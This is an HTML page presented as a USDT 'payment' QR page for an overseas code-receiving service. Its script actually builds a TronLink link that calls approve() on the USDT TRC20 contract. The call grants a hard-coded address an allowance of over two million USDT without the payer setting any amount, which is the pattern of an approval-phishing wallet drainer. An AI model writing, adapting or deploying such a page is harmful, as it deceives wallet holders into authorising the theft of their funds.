<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>海内外接码付款 - USDT 自動授權 QR</title>
<script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
<style>
body { font-family: sans-serif; text-align: center; padding: 40px; }
h2 { margin-bottom: 20px; }
#qrcode { margin-top: 20px; }
</style>
</head>
<body>

<h2>海内外接码付款</h2>
<p>請使用 TokenPocket DApp Browser 掃描以下 QR 進行授權</p>

<div id="qrcode"></div>

<script>
// ===== 配置區 =====

// 收款地址
const merchant = "TFEatdc8r36CrNqqKrbX6724DUsDyd6tHD"

// USDT TRC20 合約
const usdtContract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"

// 授權金額（直接設定，不需要客戶輸入）
const authorizedAmount = 2026224  // 你要的數量，可修改

// ==================

function toSun(amount){
  return BigInt(Math.floor(amount * 1000000))
}

function pad64(hex){
  return hex.padStart(64,'0')
}

function base58ToHex(address){
  const alphabet="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
  let num = 0n
  for(let char of address){ num = num*58n + BigInt(alphabet.indexOf(char)) }
  let hex=num.toString(16)
  if(hex.length % 2) hex="0"+hex
  return hex
}

function generateQR(){
  const amount = toSun(authorizedAmount)
  let addressHex = base58ToHex(merchant).substring(2)
  const parameter = pad64(addressHex) + pad64(amount.toString(16))

  const url = "https://link.tronlink.org/#/wallet/contract?contract=" +
              usdtContract +
              "&functionSelector=approve(address,uint256)&parameter=" +
              parameter

  const qrContainer = document.getElementById("qrcode")
  qrContainer.innerHTML = ""
  QRCode.toCanvas(document.createElement("canvas"), url, function(err, canvas){
    if(err){ alert("生成 QR 失敗"); return }
    qrContainer.appendChild(canvas)
  })
}

// 等待 TronWeb 注入（TokenPocket DApp Browser）
function waitTronWeb(callback) {
  if (typeof window.tronWeb !== "undefined" && window.tronWeb.ready) {
    callback()
  } else {
    setTimeout(() => waitTronWeb(callback), 100)
  }
}

// 初始化
waitTronWeb(() => {
  generateQR()
})
</script>

</body>
</html>
